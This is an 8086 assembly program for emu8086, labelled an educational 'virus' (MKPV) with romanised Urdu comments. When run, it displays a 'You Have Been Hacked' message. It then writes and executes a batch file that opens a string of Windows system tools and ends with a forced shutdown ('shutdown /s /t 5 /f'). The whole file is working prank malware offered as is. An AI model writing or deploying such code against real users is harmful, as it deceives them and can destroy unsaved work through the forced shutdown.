

; ============================================

; Mujtaba ka Phala Virus  " MKPV " 

; Created by: Syed Mujtaba Zaidi

; By the Supervision of Sir Javaid Tabassum

; Educational Purpose Only

; Compatible with emu8086

; ============================================


.model small 
.stack 100h

.data     

    ; Hack message
    
    hack_message db "Congratulations You Have Been Hacked By Syed Mujtaba Zaidi", 13, 10, "$"
    
  
    ; Batch file ke liye commands (Windows built-in apps)
    
    cmd1 db "start control.exe", 0
    cmd2 db "start powershell.exe", 0
    cmd3 db "start cmd.exe", 0
    cmd4 db "start cmd.exe", 0
    cmd5 db "start explorer.exe", 0
    cmd6 db "start explorer.exe /e,::{20D04FE0-3AEA-1069-A2D8-08002B30309D}", 0
    cmd7 db "start taskmgr.exe", 0
    cmd8 db "start sysdm.cpl", 0
    cmd9 db "start devmgmt.msc", 0
    cmd10 db "start calc.exe", 0
    cmd11 db "start notepad.exe", 0
    cmd12 db "start mspaint.exe", 0
    cmd13 db "start explorer.exe", 0
    cmd14 db "shutdown /s /t 5 /f", 0
    
    ; Batch file ka naam  
    
    batch_file db "mkpv2_temp.bat", 0
    
    ; Batch file execute karne ke liye command
    
    cmd_exe_win db "cmd.exe", 0
    cmd_params db 20, "/c mkpv2_temp.bat", 0Dh    ; Length byte + command + CR
    
    ; Batch file ka content
    
    batch_content db "@echo off", 13, 10
    
                  db "start control.exe", 13, 10
                  db "ping 127.0.0.1 -n 2 >nul", 13, 10
                  db "start powershell.exe", 13, 10
                  db "ping 127.0.0.1 -n 2 >nul", 13, 10
                  db "start cmd.exe", 13, 10
                  db "ping 127.0.0.1 -n 2 >nul", 13, 10
                  db "start cmd.exe", 13, 10
                  db "ping 127.0.0.1 -n 2 >nul", 13, 10
                  db "start explorer.exe", 13, 10
                  db "ping 127.0.0.1 -n 2 >nul", 13, 10
                  db "start explorer.exe /e,::{20D04FE0-3AEA-1069-A2D8-08002B30309D}", 13, 10
                  db "ping 127.0.0.1 -n 2 >nul", 13, 10
                  db "start taskmgr.exe", 13, 10
                  db "ping 127.0.0.1 -n 2 >nul", 13, 10
                  db "start sysdm.cpl", 13, 10
                  db "ping 127.0.0.1 -n 2 >nul", 13, 10
                  db "start devmgmt.msc", 13, 10
                  db "ping 127.0.0.1 -n 2 >nul", 13, 10
                  db "start calc.exe", 13, 10
                  db "ping 127.0.0.1 -n 2 >nul", 13, 10
                  db "start notepad.exe", 13, 10
                  db "ping 127.0.0.1 -n 2 >nul", 13, 10
                  db "start mspaint.exe", 13, 10
                  db "ping 127.0.0.1 -n 2 >nul", 13, 10
                  db "start explorer.exe", 13, 10
                  db "ping 127.0.0.1 -n 2 >nul", 13, 10
                  db "shutdown /s /t 5 /f", 13, 10
                  db "$"
    
    ; ANSI color codes
    
    green_color db 1Bh, "[32m", "$"    ; Green color
   
   ; reset_color db 1Bh, "[0m", "$"    ; Reset color
    
    ; Messages 
    
    msg_creating db "MKPV 2 - Script bana raha hoon...", 13, 10, "$"
    msg_executing db "Batch file execute kar raha hoon...", 13, 10, "$"
    msg_done db "Ho gaya! Batch file execute ho chuki hai.", 13, 10, "$"
    msg_file_created db "Batch file bani: mkpv2_temp.bat", 13, 10, "$"
    msg_exec_failed db "Auto-execution fail. Kripya mkpv2_temp.bat manually run karein.", 13, 10, "$"
    
    
.code
main proc   
    
    
    mov ax, @data
    mov ds, ax
    
    ; Green color set karo
    
    call set_green_color
    
    ; Hack message dikhao    
    
    lea dx, hack_message
    mov ah, 9
    int 21h
                                               
    ; 2 seconds wait karo (approximate delay)  
    
    call delay
    
    ; Creating message dikhao (green color mein)
    
    call set_green_color
    lea dx, msg_creating
    mov ah, 9
    int 21h
    
    ; Batch file banao
    
    call create_batch_file
    
    ; Executing message dikhao (green color mein)
    
    call set_green_color
    lea dx, msg_executing
    mov ah, 9
    int 21h
    
    ; Batch file execute karo
    
    call execute_batch
    
    ; Check karo ke execution successful hui ya nahi (CF set hoga agar fail hui)
    
    jc exec_failed
    
    ; Done message dikhao (green color mein)
    
    call set_green_color
    lea dx, msg_done
    mov ah, 9
    int 21h
    jmp exit_program
    
exec_failed: 
    
    ; Message dikhao ke file bani hai (green color mein)
    
    call set_green_color
    lea dx, msg_file_created
    mov ah, 9
    int 21h
    lea dx, msg_exec_failed
    mov ah, 9
    int 21h
    
exit_program:
    
    ; Exit   
    
    mov ah, 4ch
    int 21h
    
main endp


; Batch file banane ka procedure 

create_batch_file proc

    push ax
    push bx
    push cx
    push dx
    push si
    
    ; File banao  
    
    lea dx, batch_file
    mov ah, 3ch          ; File create karne ka function
    mov cx, 0            ; Normal file
    int 21h
    
    jc create_error      ; Agar error ho to jump
    
    mov bx, ax           ; File handle BX mein
    
    ; Batch content ki length calculate karo 
    
    mov cx, 0
    lea si, batch_content
    

count_length:    

    cmp byte ptr [si], '$'
    je write_file
    inc cx
    inc si
    jmp count_length
    

write_file:   

    lea dx, batch_content
    mov ah, 40h          ; File mein likhne ka function
    int 21h
    
    ; File band karo

    mov ah, 3eh          ; File close karne ka function
    int 21h
    
    jmp create_done
    

create_error: 

    ; Error handling (optional)
    
create_done: 

    pop si
    pop dx
    pop cx
    pop bx
    pop ax
    ret         
    
create_batch_file endp


; Batch file execute karne ka procedure  

execute_batch proc

    push ax
    push dx
    push bx
    push es
    push si
    push bp
    
    ; Method 1: cmd.exe /c se batch file execute karo
    ; Parameter block structure (14 bytes) banao 
    
    sub sp, 14
    mov bp, sp
    
    ; Environment segment ko 0 set karo  
    
    mov word ptr [bp], 0
    
    ; Command line pointer set karo 
    
    lea ax, cmd_params  
    
    mov word ptr [bp+2], ax    ; Offset
    mov word ptr [bp+4], ds    ; Segment
    
    ; FCBs ko 0 set karo  
    
    mov word ptr [bp+6], 0
    mov word ptr [bp+8], 0
    mov word ptr [bp+10], 0
    mov word ptr [bp+12], 0
    
    ; cmd.exe se batch file execute karo 
    
    lea dx, cmd_exe_win
    mov bx, bp          ; Parameter block address
    mov ax, 4b00h       ; Program load aur execute karo
    int 21h                   
    
    ; Stack restore karo 
    
    add sp, 14
    
    ; Agar success hui to exit
    
    jnc exec_success
    
    ; Agar fail hui to alternative method try karo
    
    ; Direct batch file ko execute karne ki koshish karo
    

    sub sp, 14
    mov bp, sp
    
    mov word ptr [bp], 0
    mov word ptr [bp+2], 0
    mov word ptr [bp+4], 0
    mov word ptr [bp+6], 0
    mov word ptr [bp+8], 0
    mov word ptr [bp+10], 0
    mov word ptr [bp+12], 0
    
    ; Direct batch file execute karo
    
    lea dx, batch_file
    mov bx, bp
    mov ax, 4b00h
    int 21h
    
    add sp, 14
    
    
    ; Check karo ke success hui ya nahi
    
    jnc exec_success
    
    
    ; Dono methods fail - carry flag set karo
    
    stc
    jmp exec_done
    
exec_success:
    
    
    clc  ; Success - carry flag clear karo
    
    
exec_done:
    
    pop bp
    pop si
    pop es
    pop bx
    pop dx
    pop ax
    ret
    
execute_batch endp

; Simple delay procedure

delay proc

    push cx
    mov cx, 0FFFFh

delay_loop:

    loop delay_loop
    mov cx, 0FFFFh

delay_loop2:

    loop delay_loop2
    pop cx
    ret

delay endp


; Green color set karne ka procedure

set_green_color proc

    push ax
    push dx
    
    ; ANSI escape code se green color set karo

    lea dx, green_color
    mov ah, 9
    int 21h
    
    pop dx
    pop ax
    ret

set_green_color endp

end main
